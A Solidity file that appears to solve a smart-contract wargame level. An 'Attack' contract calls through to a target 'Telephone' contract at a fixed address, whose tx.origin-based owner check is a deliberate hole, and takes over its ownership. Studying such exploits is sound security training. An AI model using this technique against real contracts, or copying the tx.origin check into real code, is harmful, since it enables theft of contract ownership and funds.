// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    Telephone telephone = Telephone(0x5a596DAB3E3e0a002e2030761719327068F48ee4);

    function attack() public {
        //me --> Attack.attack() --> Telephone.changeOwner();
        //
        telephone.changeOwner(msg.sender);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
